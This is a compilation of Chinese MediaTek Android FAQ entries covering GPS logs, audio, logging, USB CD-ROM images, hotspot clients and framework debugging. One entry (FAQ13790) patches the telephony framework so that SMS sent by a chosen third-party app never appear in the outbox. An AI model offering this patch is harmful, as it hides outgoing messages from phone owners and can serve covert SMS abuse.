通过从打开GPS的第一条GPGGA语句来确认是什么启动方式，如果该语句中的时间是235944，那么表示没有时间辅助资讯，这是完全冷启动；如果有时间信息，但是位置是8960.0000，N，0000.0000，E，这表示是冷启动；如果既有时间也有位置，可以看第一条PMTKEPH中是几颗有卫星的星历，如果一颗没有，那么这是暖启动；如果发现也有位置、时间、而且至少4颗以上的星历，那么这是热启动。

10. 定位

看定位精度，请以3D定位为准。因为2D定位下定位精度会很大。

11. 如何判断是否是coclock
000045.784,HBD,IF1,BOT,ClkType,254
这里的254表示是coclock，255表示是TCXO。
如果是coclock，那么可以通过如下log判断是否有校准成功。
000069 $PMTK013,32,ClkType,254,C0,1.373238,C1,-0.196573,k,1*24
12, 如何判断GPS power 成功。
请通过GPS_INIT_DONE来确认。
13，如何判断之前有没有定位成功过。
这在AGPS 认证测试中经常会用来判断测试前是否有3D fix过。
请通过PMTKDBG的倒数第五个数据是否非0，如下红色部分。
000103 $PMTKDBG,12,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,
0093,0001,0002,0000,0000,0022,0001,0000,0.0000,0.0224,0.0000,0.0000,0.0000,0.0000,*4C

14, 如何确认MNL Version。
通过000045.807,HBD,IF1,BOT,MNLVer,AXN_3.60,1312,MNL_VER_14011701ALPS05_3.60_06,22,40
15,如何确认acqusition、bit sync、subframe sync的状态。
请过如下log，下面log中表示捕获到9颗卫星，有9颗卫星已经bit sync，6颗卫星子帧同步。
$PMTK015,532335,6,438756,NACQ,9,NBS,9,NSFS,6,NEXS,6*6C
```

## [gps]  [FAQ14127]  GPS问题调试—NTP/NLP/EPO加速定位功能

```text
NTP/NLP的加速定位功能，是由NTP提供时间辅助、NLP提供位置辅助，再加上EPO 提供星历辅助，旨在达到在有网络情况下，所有场景都是热启动。

这篇文档会介绍
1， NTP/NLP/EPO的下载和触发原理。
2， 如何check NTP/NLP/EPO起到作用。

[SOLUTION] 

NTP/NLP主要是加速定位时间TTFF，其原理是获取如下三者，以此来加速定位时间。
NTP给时间；
NLP给位置；
EPO给星历。
NTP/NLP/EPO的下载和触发原理。
对于NTP，在手机开机后，要通过网络同步一次时间时间就可以了,那么在后续（没有网络也没有问题）使用gps应用时，NTP就可以派上用场。
对于NLP，必须要每次都要有网络，而且手机设置下位置辅助需要设置为高精度，那么在打开gps应用是，NLP才会起到作用。
对于EPO，触发下载的流程如下：

该功能要在客户的软件包里，需要包含两件事情，这两件事情都可以通过这个FAQ里的几个check工作检查。
1，ALPS01856056的patch。
2，NLP APP，例如百度、GMS、高德。对于这一点，MTK已经和baidu合作，对于客户可以有两种方式来做。方式一是客户可以直接从MTK拿BAIDU NLP APP；方式二是客户和NLP 厂商取得。

要判断NTP/NLP是否有起到加速作用，check 工作是必要的。

l  对于NTP
不会有问题，不需要检查。

l  对于EPO
不会有问题，不需要检查。
可以从录制的gps debug log中check “$[AGT] ,Extract epo done”

l  对于NLP 
可以从录制的gps debug log中check “$DBnm_NLP”

或者是check mobile log中的 “gps_mtk : mtk_gps_inject_location:”

否则，请check如下5步。。

1， Does your NLP package name (ex: GMS or Baidu NLP) exist in config.xml?

frameworks\base\core\res\res\values\config.xml

<string-array name="config_locationProviderPackageNames" translatable="false">
    <!-- The standard AOSP fused location provider -->
    <item>com.android.location.fused</item>
    <!-- MTK add for GMS -->
    <item>com.google.android.gms</item>           请重点看这这里：GMS
    <item>com.baidu.map.location</item>           请重点看这这里：BAIDU
    <!-- MTK add end -->
</string-array>

2， Is NLP (ex: GMS or Baidu NLP) installed in your DUT?
对于GMS，可以check在手机上是否有google map、gmail、play store等app。
对于Baidu，可以check setting-》app->all， 检查是否有NetworkLocation（网络定位）存在。如果没有，请安装。如果是手动安装，请一定要重启一次手机才可以生效。
对于其他，请check 相关NLP 服务是否有安装。

3， Does NLP service (MTK proprietary module) exist?
请到设置-》app->all， 检查是否有MTK NLP Service存在。如果没有，请到PMS系统上申请ALPS01856056的patch。

4， Is NLP enabled from Settings?
可以check setting-》location-》mode，如下：

5， Does you turn on Wi-Fi connection or Data connection?
```

## [性能]  [FAQ14117]  单个APP优化时间过长的问题

```text
单个APP优化时间过长会导致开机时间过长的问题，这种情况主要是dex2oat使用的优化线程数较少导致的。可以尝试如下的解法。

[SOLUTION] 
1.判断当前使用的线程数
形如下面的Log表示，当前使用了2个线程
dex2oat : dex2oat took 5.745s (threads: 2)
2.如果线程数小于CPU的核心数，在L0版本上可以申请如下的patch:
ALPS02069213 
3.在某些L1版本上面需要修改如下的文件：
修改的art/dex2oat/dex2oat.cc这个文件中的下面的代码：
818 static int dex2oat(int argc, char** argv) {
   ............
872   int thread_count = sysconf(_SC_NPROCESSORS_CONF);
873   //if (thread_count >= 2)  {
874   //  thread_count /= 2;
875   //}
```

## [FAQ13090]  三方apk接收不到开机广播

```text
自启动失败/接收不到BOOT_COMPLETED广播可能的原因:

[SOLUTION] 
(必现)
(1)、BOOT_COMPLETED对应的action和uses-permission没有一起添加
需要三方应用在AndroidManifest.xml中写入：
<action android:name="android.intent.action.BOOT_COMPLETED" ⁄>
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" ⁄>
(2)、应用安装到了sd卡内，安装在sd卡内的应用是收不到BOOT_COMPLETED广播的.
(概率出现 )
(3)、对于android3.1以后版本，如果要应用接收开机广播有两种方法：
a).将应用预置到/system/app/目录。
b).安装应用后先启动一次，适用于有Activity的应用。
注释：
1、BOOT_COMPLETED这个广播比较特殊，预置到system/app下面的apk才会通过android.intent.action.BOOT_COMPLETED来开机自启动。而预置到data/app,vendor/app下面的三方apk，若安装从来没有启动过和被用户手动强制停止，它就是处于“stopped state”(此应用的信息保存在/data/system/users/0/package-restrictions.xml中)，它的接收器将会无法接收任何广播，无法开机之后自动启动。但是安装这个应用之后只要是有手动去点击下这个apk，下次开机就肯定是会自动启动起来的，也是接收这个BOOT_COMPLETED广播。

2、与此同时系统增加了2个Flag：FLAG_INCLUDE_STOPPED_PACKAGES和FLAG_EXCLUDE_STOPPED_PACKAGES ，来标识一个intent是否激活处于“stopped state”的应用。

3、Google允许应用和后台服务通过给广播intent设置FLAG_INCLUDE_STOPPED_PACKAGES来唤醒处于“stopped state”的程序，也就是用户自己写的广播intent可以控制这个机制，但是系统自带的广播intent默认都是FLAG_EXCLUDE_STOPPED_PACKAGES，由于不能修改，所以就没法通过系统广播自启动了。
```

## [FAQ13790]  L如何让三方APK发送的SMS不显示出来

```text
在GsmSMSDispatcher.java (alps\frameworks\opt\telephony\src\java\com\android\internal\telephony\gsm) 中找到所有
if (SmsApplication.shouldWriteMessageForPackage(callingPkg, mContext) ...){...}的地方有五处

在此if语句块条件外面增加一个判断，如：
if(!callingPkg.equals("贵司的三方应用名")){
    if (SmsApplication.shouldWriteMessageForPackage(callingPkg, mContext) &&!isFilterOutByPpl(destAddr, text)) {
        messageUri = writeOutboxMessage(getSubId(), destAddr, text, deliveryIntent != null,callingPkg);
    }
}
温馨提示：如果不确定"贵司的三方应用名"是怎样，可以在修改前添加log打印出callingPkg
```

## [FAQ08791]  设置中，辅助功能下的增强网页辅助功能解释

```text
设置->辅助功能->增强网页辅助功能
使用talkback（谷歌辅助程序，帮助盲人等视障用户操作设备）操作手机，浏览网页的时候，辅助功能里面允许插入网页脚本以后，就可以操作浏览器了。
```

## [CMD]  [FAQ14081]  如何判断android OS是32位还是64位?

```text
简单的方法是查看是否存在/system/lib64目录，可以通过adb shell ls /system/lib64看是否可以看到。
```

## [FAQ13906]  [Others] 从“百度图片”下载图片出现异常

```text
步骤： 默认浏览器进入百度-》选择图片-》进入单张图片-》点击浏览器底端的“下载”按钮（重要）
可能会出现如下现象：
 
1. 去下载app里直接点击刚才下载的图片, 提示图片无法打开.
2. 去设置、显示、壁纸、图库, 在图库里选择刚才下载的图片就会报错.
3. 下载gif格式图片，在图库中打开后发现图片是静态的.
4. 下载多张图片后, 去图库查看, 只有部分显示.
 
[SOLUTION] 

经过确认：所有问题的根源均在于下载时，服务器传送的图片mime_type类型出错:
原本image/jpeg类型的，下载后是"image/jpeg"
原本image/gif类型的，下载后是"image/gif"
即：比原本的mime_type类型多了一对引号。且该mime_type值是写入到数据库（db）中的。

问题1的原因是下载app的intent中mime_type不匹配；
问题2的原因同上；
问题3的原因是因为显示时，从db中读出的类型不对，不会按照动态显示；
问题4的原因是有些图片插入数据库之后，还会再次扫描update，从db中读出的mime_type不对，导致修改了media_type为0，gallery中query数据库时限制media_type为1，因此不会在gallery中显示。

因为是服务器的原因（本身服务器传的mime_type值有问题），一般情况下由于服务器的error类型各种各样，Download端不可能针对所有情况都处理，因此默认不做处理，即：保持这些错误。

若必须要修改，请参考FAQ12292：浏览器下载文件无法打开的修改方法，在图片信息插入到db之前就更改错误的mime_type。
```

## [FAQ13557]  [Audio Profile] 打开MTK_SAFEMEDIA_SUPPORT后，插入耳机，第三方播放器的音量无法调节到最大

```text
第三方视频播放器，用的音量调节框是播放器自身的，所以不能跟系统自带的铃声选择框一样，可以弹出铃声最大警告框，点击“确认”后，才可以继续调大音量。
改法：
将VolumePanel.java里的在onDisplaySafeVolumeWaring()里最前面的if((flags&AudioManager.FLAG_SHOW_UI)!=0 || mDilalog.isShowing())  这个判断条件去掉
```

## [sound]  [FAQ13933]  如何修改系统提示音 (ex:触摸提示音)

```text
有两种方法可以修改:
1.修改音频参数,系统音的参数位于

KK: AudioMTKPolicyManager.cpp
L:AudioCustomVolume.h
根据如下mode调整
audiovolume_system[NUM_OF_VOL_MODE]  [AUDIO_MAX_VOLUME_STEP] 数组:
enum VolumeMode {
    VOLUME_NORMAL_MODE = 0,
    VOLUME_HEADSET_MODE,
    VOLUME_SPEAKER_MODE,
    VOLUME_HEADSET_SPEAKER_MODE,
    NUM_OF_VOL_MODE
};

2.修改音源:

修改相应音源,
如: 触摸提示音的音源是/media/audio/ui/Effect_Tick.ogg 
```

## [USB]  [FAQ05690] How to add ISO files into BICR?

```text
对于KK版本：
1. 将ISO文件放到alps/system/mobile_toolkit/目录下
2. 修改LOCAL_MODULE为ISO文件名，修改LOCAL_MODULE_TAGS为optional alps/system/mobile_toolkit/Android.mk
3. 将ISO文件名添加进PRODUCT_PACKAGES  alps/build/target/product/$project.mk
4. 修改ISO文件名 alps/mediatek/config/<project>/init.rc
5. 编译：./mk <project> new

对于L版本：
1. 替换alps\device\mediatek\common\iAmCdRom.iso
2. 如果要设置BICR为默认，修改alps\device\mediatek\common\device.mk文件相应的ADDITIONAL_DEFAULT_PROPERTIES += persist.sys.usb.config=bicr
3. make & download
```

## [语言]  [FAQ08810]  [Others] 如何将工厂模式的内容显示，从中文修改为英文

```text
开机按开机键+下音量键，进入工厂模式。目前内容显示为中文，如何修改为英文显示。
[SOLUTION] 
（1）关掉GB2312 option。
ICS版本：
\mediatek\source\factory\src\miniui\font.mk中SUPPORT_GB2312 := yes改为no
GB3,JB,JB2版本：
\mediatek\factory\src\miniui\font.mk中SUPPORT_GB2312 := yes改为no
JB3及JB3之后版本：
\mediatek\config\[project name] \ProjectConfig.mk
和\mediatek\config\common\ProjectConfig.mk中MTK_FACTORY_MODE_IN_GB2312=yes改为no
（2）参考uistrings_eng.h将factory.ini中各MenuItem翻译为英文。
例如：
MenuItem=Keys;
MenuItem=Jogball;
MenuItem=OpticalFingerNavi;
MenuItem=Touch Panel;
（3）重新build，再验证，可以使用ADB command（cat /etc/factory.ini）来验证手机中的factory.ini是否有更新成功。
```

## [log]  [FAQ13883]  如何配置mtklogger各种参数

```text
配置mtklogger各项参数
[SOLUTION] 
配置文件路径
KK版本 :
alps/mediatek/external/xlog/tools/mtklog-config-eng.prop (若配置userload则是mtklog-config-user.prop）
L 版本:
alps\vendor\mediatek\proprietary\external\xlog\tools\mtklog-config-eng.prop  (若配置userload则是mtklog-config-user.prop）

配置文件内容解析
#注意所有赋值后面不要有空格，否则无法解析
#默认存储路径
mtklog_path = internal_sd/external_sd
#默认是否开机自启动
com.mediatek.log.mobile.enabled = true/false
com.mediatek.log.modem.enabled = true/false
com.mediatek.log.net.enabled = true/false
com.mediatek.log.taglog.enabled = true/false
#默认存储大小
com.mediatek.log.mobile.maxsize = 300
com.mediatek.log.mobile.totalmaxsize = 800
com.mediatek.log.net.maxsize = 200
com.mediatek.log.modem.maxsize = 600
 
查看手机中mtklogger当前设置状态
cat /data/data/com.mediatek.mtklogger/shared_prefs/com.mediatek.mtklogger_preferences.xml
```

## [FAQ07757]  [Audio Tuning Tool]  adb.exe识别不到设备

```text
由于adb.exe会与VID&PID绑定，如果客户修改了ADB的VID&PID，可能会导致SDK(Software Development Kit)中的adb.exe识别不到设备，此时在命令行提示符界面下敲入adb devices或者adb shell都会提示错误。
[SOLUTION] 
可以按照下面的方法适配ADB的VID。
使用Google原生的adb.exe，然后添加一个外部的配置文件adb_usb.ini。具体操作如下：
找到adb.exe的安装目录，假如adb.exe在C盘：
— 搜索整个C盘寻找文件夹“.android”
— 新建“adb_usb.ini”文件拷贝到“.android”文件夹下
— 在“adb_usb.ini”文件中填写相应ADB设备的VID，可以参考如下截图，e.g. 0x17EF 
 
— 运行：adb kill-server
— 运行：adb start-server
— 此时再运行“adb shell” 就可以连上ADB了。
```

## [log]  [FAQ08064]  [Debug] 如何抓取vm log

```text
抓取VM log步骤如下：
1，Enter Engineer Mode\Audio\SpeechLogger，Mark "Enable Speech log" 
2，Mark "Normal -VM+EPL" 
3, Mark"Dump Speech Debug Info" 
4,Set Engineer Mode\Audio\speech enhancement/Common para 0=6 
5，After finish above setting, every call will be recorded as a .vm file automatically, and saved in ""mtk log\audio dump\"
VM log是用来记录声音数据的，您在测试时麻烦讲话大声一点，而且通话时间也稍稍长一点，至少保证通话有一分钟，这样方便我们来解析数据分析。
```

## [FAQ11544]  [USB]  [CDROM] 如何设定打开CDROM后windows弹出自动播放窗口?

```text
该feature实现与代码无关，是通过CDROM内置的iso镜像客户化完成的。
制作iso镜像文件时，在根目录添加autorun.inf文件，
内容格式：
[autorun] 
Icon=my.ico                                      //光盘图标
open=客制化执行程序的路径                    //默认执行的程序
shell\加密文件\command=UDE.exe          //右键磁盘的操作项
==================================================================
同理，如果要修改连接PC后的UMS功能出现的U盘的盘符对应的图标，
1、用记事本在U盘或硬盘下编辑如下内容：
[autorun]  
icon=*.ico 
2、把*.ico图标文件复制到移动存储设备根目录。 
3、然后把此文件保存为Autorun.inf 
4、将这两个文件（图标文件和inf文件）的属性改为只读、隐藏。 
注：*代表图标文件名 
Notice:
这个autorun.inf的方法适用于U盘，CDROM.iso，UMS时可能需要修改android的权限，默认不能在根目录放文件。
```

## [sound]  [FAQ13720]  [Audio APP] 歌曲名称以拼音排序时，以'a' 'an' 'the'开始的歌曲不做任何处理

```text
1、请在PinyinKeyUtils.java文件的keyFor方法中修改如下：
public static String keyFor(String name) {
    ……
    name = name.trim().toLowerCase();
    //删除以下
    if (name.startsWith("the ")) {
        name = name.substring(4);
    }
    if (name.startsWith("an ")) {
        name = name.substring(3);
    }
    if (name.startsWith("a ")) {
        name = name.substring(2);
    }
    //删除以上
    ……
}
2、将歌曲文件删除后重新copy才会生效。
```

## [FM]  [FAQ13721]  [AudioApp] 软件disable FM

```text
请在mediatek\config\project下的ProjectConfig.mk文件中修改如下：
MTK_FM_SUPPORT=no
MTK_FMRADIO_APP=no
```

## [FAQ13722]  [FM] FMRadio录音时，若意外停止，能保存录音文件

```text
请在如下进行修改,
1、FMRadioService.java
  private void exitFM() {
      ……
     else if (FMRecorder.STATE_RECORDING == fmState) {
               //添加如下
               mFMRecorder.StopRecordOrPlay();     
                LogUtils.d(TAG, "StopRecordOrPlay");
String defaultName = getRecordingName();
saveRecording(defaultName);
               //添加如上     
                /*mFMRecorder.discardRecording();  
                LogUtils.d(TAG, "Discard Recording.");*/    //删除原来的代码
            }……
2、请在FMRecorder.java文件中添加如下：
public void StopRecordOrPlay() {
   LogUtils.d(TAG, ">> StopRecordOrPlay");
    // release recorder
    if ((STATE_RECORDING == mInternalState) && (null != mRecorder)) {
        stopRecorder();
   // release player
    } else if ((STATE_PLAYBACK == mInternalState) && (null != mPlayer)) {
        stopPlayer();
    }
}
```

## [知识点]  [FAQ13788]  关于平台PPPoE的支持情况

```text
PPPoE协议全称是PPP over Ethernet，是在以太网络中转播数据包的一种拨号上网技术，比如电信网络的ADSL就是用PPPoE进行拨号链接。
那么Android支持PPPoE功能吗?
[SOLUTION] 
Android本身是不支持PPPoE的，而PPPoE并非类似TCP/IP的基础协议，而是一种封装协议，即可以通过3rd的资源来实现。
MTK平台也不支持PPPoE功能，在部分版本开放了PPPoE的API，java层对应的编译开关为MTK_CTPPPOE_SUPPORT，可以通过在工程中搜索这个编译开关来跟踪代码流程。
```

## [FAQ13614]  NOD32 认为DM.apk以及SmsReg.apk是病毒的原因

```text
通过NOD32 Mobile Security & Antivirus应用检查软件会出现Gedma. E, Gedma. C 俩个疑似病毒,经分析怀疑NOD32 Mobile Security & Antivirus应用检测出来的结果因为手机存在dm.apk和SmsReg.apk俩个APK导致的
[SOLUTION] 
Dm.apk和SmsReg.都会去向服务器发送注册的信息，其中内容包含：IMEI,Manufacture,Model,Software Vewsion
杀毒软件认为两个apk有去收集手机信息而去做这种判断。
 
dm是指device manager，而smsreg是CMCC需要的dm，也就是定制的dm。
dm中比较常用的是FOTA功能，也就是OTA升级，它会收集手机的信息到服务器，服务器根据这些信息做鉴权，然后检查是否有新版本，然后决定是否给手机新版本的差分包。
那smsreg也是会收集一些常用的配置信息，而且smsreg这个需求，CMCC目前已经不再要求，这个功能可以直接去掉。
另外dm中主要是FOTA功能，如果不用，也可以关闭。具体请参照FAQ12918。
```

## [log]  [browser]  [FAQ13601]  怎样打印出手机上网时访问的网址内容?

```text
手机访问网络时会用浏览器输入网址，这些是用户界面可见的；
apk也需要通过网址访问apk的服务器，这些在用户界面不可见。
那么如何在手机端把访问的网址打印出来呢?
[SOLUTION] 
其实平台默认已经会打印这些dns query数据了，示例如下：
01-30 17:54:12.740885 241 6353 D libc-netbsd: res_queryN name = gmail-smtp-in.l.google.com, class = 1, type = 1
01-30 17:54:12.741026 241 6353 D libc-netbsd: res_queryN name = gmail-smtp-in.l.google.com succeed
01-30 17:54:13.921741 241 6354 D libc-netbsd: res_queryN name = www.google.com <http://www.google.com/> , class = 1, type = 1
01-30 17:54:13.944311 241 6354 D libc-netbsd: res_queryN name = www.google.com <http://www.google.com/>  succeed
01-30 17:57:59.523221 241 6378 D libc-netbsd: res_queryN name = supl.sonyericsson.com, class = 1, type = 1
01-30 17:57:59.555766 241 6378 D libc-netbsd: res_queryN name = supl.sonyericsson.com succeed

这部分代码在getaddrinfo.c中的res_queryN()函数中，只要是本机发起的dns query，不论是使用wifi或data及使用浏览器或apk都会经由这里。
所以我们可以在这里打印出本机主动发起的链接。
提醒：
若本机作为热点，其他链接到热点的设备访问网络，这样的访问信息在本机是没有办法抓到的。
原因是本机当前作为热点启用的是dnsmasq应用，这个应用只有转发数据包的功能，并不会到dns libc。
```

## [sound]  [FAQ13589]  [Audo framework]  L 版本上播放歌曲是否使用 NuPlayer

```text
在 Android default code 中, L 版本播放歌曲是使用 NuPlayer 来做的
但出于功耗方面的考量, 我司对下面两种格式的歌曲仍然会使用 awesomeplayer 来播放
这两种格式是
audio/mpeg
audio/ape
 
AwesomePlayer 在工作时开的 thread 更少, 所以功耗表现会相比与 NuPlayer 好
如果希望与 android default code 保持一致
请参考如下 solution
[SOLUTION] 
修改frameworks/av/media/libmediaplayerservice/MediaPlayerService.cpp 中的
status_t MediaPlayerService::Client::setDataSource(int fd, int64_t offset, int64_t length) 方法内
找到下面这段代码, 并将其注释掉:
if(!strcasecmp(tmp,"audio/mpeg") || !strcasecmp(tmp,"audio/ape")) {
    playerType = STAGEFRIGHT_PLAYER;
}
```

## [sound]  [FAQ13587] 音效设置界面右上角的开关图标未居中显示

```text
在 KK 版本上, 上述图标会显示为相对居中, 显示效果比较友好
而 L 版本上, 此图标则相对比较靠左, 或靠右显示
 
如果需要调整为较居中显示开关图标,
可以参考以下解法
 
[SOLUTION] 
修改 vendor/mediatek/proprietary/frameworks/base/res/res/values/styles.xml
中 <item name="android:switchMinWidth">80dp</item> 的定义
原值是 80, 可改为 60 或其它实际调整后觉得看起来比较合适的值
```

## [sound]  [FAQ13583] 如何在music中屏蔽不支持的音乐

```text
首先, 你需要知道这些要屏蔽的音乐文件的 mimeType,
如果不知道, 可去mediaProvier 的 database 中查询对应的音乐文件的 mime_type 的值

假定我们已经知道要屏蔽的音乐文件的 mimeType 为 audio/x-ms-wma 则我们可以通过如下方法去做屏蔽处理

[SOLUTION] 
1: 如果只在 Music apk 中做屏蔽处理(其它三方 apk 不做屏蔽处理)的话, 可以参考下面改法:
修改 Music apk 包中 TrackBrowserActivity.java 
在 getTrackCursor 方法内
找到下面这行
where.append(" AND " + MediaStore.Audio.Media.IS_MUSIC + "=1");
在它后面加入:
where.append(" AND mime_type != 'audio/x-ms-wma'");  //其中红色字体的为所需要屏蔽的 mimetype, 请按需修改
 
2: 如果要在 framework 中做屏蔽处理(任何 apk 都无法查到被屏蔽的文件):
可以参考下面的改法:
修改 MediaScanner.java
 
1: 添加定义:
static String MIME_UNKNOWN = "unknown_mime";
 
2: 增加方法
private boolean isUnsupportMime(){
    if(mMimeType == null) {
        return false;
    }
    if(mMimeType.equals("audio/x-ms-wma")){ 
        return true;
    } //如果还有其它想过滤掉的 mimetype, 请再加入 else if(mMimeType.equals("xxx")) return true;
    return false;
}

3: private ContentValues toValues() 方法首行加入:
if(isUnsupportMime()){
    Log.d(TAG,"change mime to unknown");
    mMimeType = MIME_UNKNOWN;
    mNoMedia = true;
}

4: endFile 方法中在如下参考行
ContentValues values = toValues();
之后加入:
if(mMimeType != null && mMimeType.equals(MIME_UNKNOWN)){
    mFileType = 0;
    music = 0;
}
```

## [FAQ12999]  [sound] 音乐播放列表丢失

```text
开启MTK_2SDCARD_SWAP后，内置SD CARD的第一次开机：
1.进入本地音乐点击任意歌曲添加至新建播放列表A;
2.连接USB存储添加任意音频文件至SD卡;
3.添加成功后关闭USB存储，返回查看新建播放列表：发现之前创建的列表A已经丢失;
4.再次新建一个播放列表B;
5.连接USB存储后，进入本地音乐查看新建播放列表：第一次创建的列表A重新出现，但列表B不存在；
6.关闭USB存储,查看新建播放列表：列表B正常显示;
 
[SOLUTION] 

=====================================================================
开启MTK_2SDCARD_SWAP后，内置SD CARD的第一次开机：
 
1.进入本地音乐点击任意歌曲添加至新建播放列表 A 
>>>创建external-xxx.db; 列表A在external-xxx.db

2.连接USB存储添加任意音频文件至SD卡
>>>external-xxx.db被重命名为external.db;

3.添加成功后关闭USB存储，返回查看新建播放列表
>>>创建一个新的external-xxx.db；从external-xxx.db查询，从而这里找不到之前的列表A

4.再次新建一个播放列表B
>>>列表B被写入external-xxx.db
 
5.连接USB存储后，进入本地音乐查看新建播放列表：第一次创建的列表A重新出现，但列表B不存在；
>>>查询external.db,从而找到了之前的列表A，找不到列表B
 
6.关闭USB存储,查看新建播放列表：列表B正常显示;
>>>查询external-xxx.db，找到列表B
=====================================================================
```

## [GPS] GPS 相关问题

```text
FAQ13253 GPS问题分类--AGPS认证相关 SW > ALPS > GPS 2014-12-31
FAQ13252 GPS问题分类--GPS资料 SW > ALPS > GPS 2014-12-31
FAQ13251 GPS问题分类--测试相关 SW > ALPS > GPS 2014-12-31
FAQ13247 GPS问题分类--LOG相关 SW > ALPS > GPS 2014-12-31
```

## [FAQ11156]  手机做热点时，如何获取连过来设备的具体信息?

```text
手机做热点时，可以读取连过来的client的信息，平台默认会显示mac地址在热点热点设定界面。
[SOLUTION] 
1、连过来的设备的信息存放在/data/misc/dhcp/dnsmasq.leases中
2、它的格式是：
/系统id，不需取值/client mac地址/client ip地址/ client device name/加权后mac地址，也不需取值
1357041758   88:00:12:34:56:78 192.168.43.133 android-184cc6c105d7a3b 01:88:00:12:34:56:78
 
2、参考WifiServie.java的getClientIp()方法，可以客制化这个方法取得device name，具体如下：
public String getClientDeviceName(String deviceAddress) {//传mac地址进来
    enforceAccessPermission();
    if (TextUtils.isEmpty(deviceAddress)) {
        return null;
    }
//读取对应的文件信息
    for (String s : readClientList("/data/misc/dhcp/dnsmasq.leases")) {
        if (s.indexOf(deviceAddress) != -1) {
            String[]  fields = s.split(" ");
//校验数据是否破损
            if (fields.length > 4) {
//返回第4个栏位
                return fields[3] ;
            }
        }
    }
    return null;
}
```

## [debug]  [FAQ11153]  如何确认是谁修改了SettingsProvider中某变量的值

```text
以下以Settings.Global.WIFI_SLEEP_POLICY为例，对应的value是wifi_sleep_policy，其他变量请具体配置对应value：
1:修改Settings.java (alps\frameworks\base\core\java\android\provider) 中
在 class Secure 内部类的
public static boolean putStringForUser(ContentResolver resolver, String name, String value, int userHandle) {
    //的后面添加
    if(name.equals(Settings.Global.WIFI_SLEEP_POLICY)){ //add begin
        Log.d(TAG,"@@## name = "+ name+ "value = "+value,new Exception("Settings"));
    } //add end

2:修改
ContentResolver.java (alps\frameworks\base\core\java\android\content)中
在
public final Uri insert(Uri url, ContentValues values) {
    后添加
    if(values.containsKey("wifi_sleep_policy")){//add begin
        Log.d("Settings","@@##@@ url = "+ url+", values = "+ values,new Exception("Settings"));
    }//add end
在
public final int update(Uri uri, ContentValues values, String where, String[]  selectionArgs) {
后添加
    if(values.containsKey("wifi_sleep_policy")){//add begin
        Log.d("Settings","@@## url = "+ uri+", values = "+ values,new Exception("Settings"));
    }//add end
 
3、复制问题并提供main_log，通过对应的callstack可以找到是谁操作了变量。
```

## [debug]  [FAQ11160]  定位是谁通过注册AlarmManager来发intent

```text
有些intent是通过AlarmManager注册后发送的，可能是第三方的apk，这会为user带来干扰以为出现了bug，可以通过下面的log进行定位。
 
[SOLUTION] 
以某次发送 WifiManager.action.DELAYED_DRIVER_STOP 为例：
01-01 00:07:31.773   669   717 E AlarmManager: Alarm at trigger: Alarm{42d14330 type 0 android}
01-01 00:07:31.773   669   717 V AlarmManager: Native set alarm :Alarm{41c22b28 type 0 com.xxxx.safecenter}
01-01 00:07:31.773   669   717 V ActivityManager: Broadcast: Intent { act=com.android.server.WifiManager.action.DELAYED_DRIVER_STOP flg=0x14 (has extras) } ordered=true userid=0 callerApp=null
 
可以看到在 setalarm 后 intent 就被发出，往前看log找到是 com.xxxx.safecenter 设定了它；
对应的代码在 AlarmManagerService.java 的 toString() 方法，会打印 package name。
```

## [FAQ10074]  勾选USB调试后关闭开发者选项后退出再进入开发者选项为打开状态

```text
Developer options的总开关会在进入developer options的时候去做这样的一个判断：
是否所有的developer options选项都被关闭，若没有，就会重新开启developer options总开关；
所以若是想要总开关成功关闭，需要先关掉所有的developer选项，然后再关闭总开关才能生效。
相关代码：DevelopmentSettings.java onResume()
if (mHaveDebugSettings && !mLastEnabledState) {
    // Overall debugging is disabled, but there are some debug
    // settings that are enabled.  This is an invalid state.  Switch
    // to debug settings being enabled, so the user knows there is
    // stuff enabled and can turn it all off if they want.
    Settings.Global.putInt(getActivity().getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 1);
    mLastEnabledState = true;
    mEnabledSwitch.setChecked(mLastEnabledState);
    setPrefsEnabledState(mLastEnabledState);
}

此为google 原生设计。
```

## [CMD]  [FAQ13081]  64bit系统上，如何判断运行的进程是32bit还是64bit

```text
64bit系统上，运行的进程可能是32bit，也可能是64bit，这里给出判断的方法。
[SOLUTION] 
确认adb可以连接成功后，执行命令: adb shell ps --abi，ABI一栏如果包含"32"，说明为32bit，否则为64bit。下面以内部参考机运行上述命令后的结果为示例：
```

## [CMD]  [FAQ13077]  如何判断当前机器运行的kernel是32 bit还是64bit

```text
搭载64bit芯片的机器，运行的kernel可能是32bit，也可能是64bit，这里给出判断的方法。 
 
[SOLUTION]  
判断方法有如下两种： 
1. 确认adb可以连接成功后，执行命令: adb shell cat /proc/cpuinfo，Processor一项如果包含"aarch64 "，说明为64bit kernel，否则为32bit。下面为内部参考机kernel分别为32bit、64bit时运行上述命令后的结果：

2. 确认adb可以连接成功后，执行命令: adb shell cat /proc/sys/kernel/osbit，如结果为"64 "，说明为64bit kernel，否则为32bit。
下面为内部参考机kernel为64bit时运行上述命令后的结果：
```

## [email]  [FAQ08944]  预置邮件客户端中的签名

```text
预置或者客制化邮件客户端中的发信人签名，如：
英文:
Send via Pandora
中文:
发送自潘多拉
 
[SOLUTION] 
File:
Email/src/com/android/email/activity/setup/AccountSetupNames.java
# class FinalSetupTask # function doInBackground(Void... params):
add line：
        cv.put(AccountColumns.SIGNATURE, getString(R.string.signature));
below the line:
        ContentValues cv = new ContentValues();
Please NOTE that "R.string.signature" is a new string resource you need to add.
For your case, please add a new String resource R.string.signature as "Send via Pandora", which is easy to do i18n as well.
If you want to change this default signature to others, modify the R.string.signature as you wish.
```

## [log]  [FAQ12752]  如何修改MTKlogger默认存储容量大小

```text
有时候debug问题需要，需要修改MTKlogger的默认存储容量。

请修改alps\mediatek\external\xlog\tools\ 下的mtklog-config-XXX.prop文件,
将对应mobile log，modem log，net log的maxsize修改为需要的值即可。
```

## [storage]  [FAQ13440]  用搜狗表情符号命名文件夹，有的成功，有的不成功

```text
不同的文件系统对表情符号的支持度是不同的：
EXT4：支持
FAT：不支持

在打开SD SAHRED的情况下：
phone storage：文件系统是ext4，在file manager中用表情符号命名，是可以成功的。
SD：文件系统是FAT，在file manager中用表情符号命名，会返回操作失败的信息

在没有打开SD SHARED的情况下：
phone storage和SD： 文件系统是FAT，不支持表情符号命名。

上述描述的是手机端，手机端支持并不表示PC端也会支持，因为PC端是FAT的文件格式，请知悉～


TODO : FAT 和 EXT4 文件格式的区别???
```

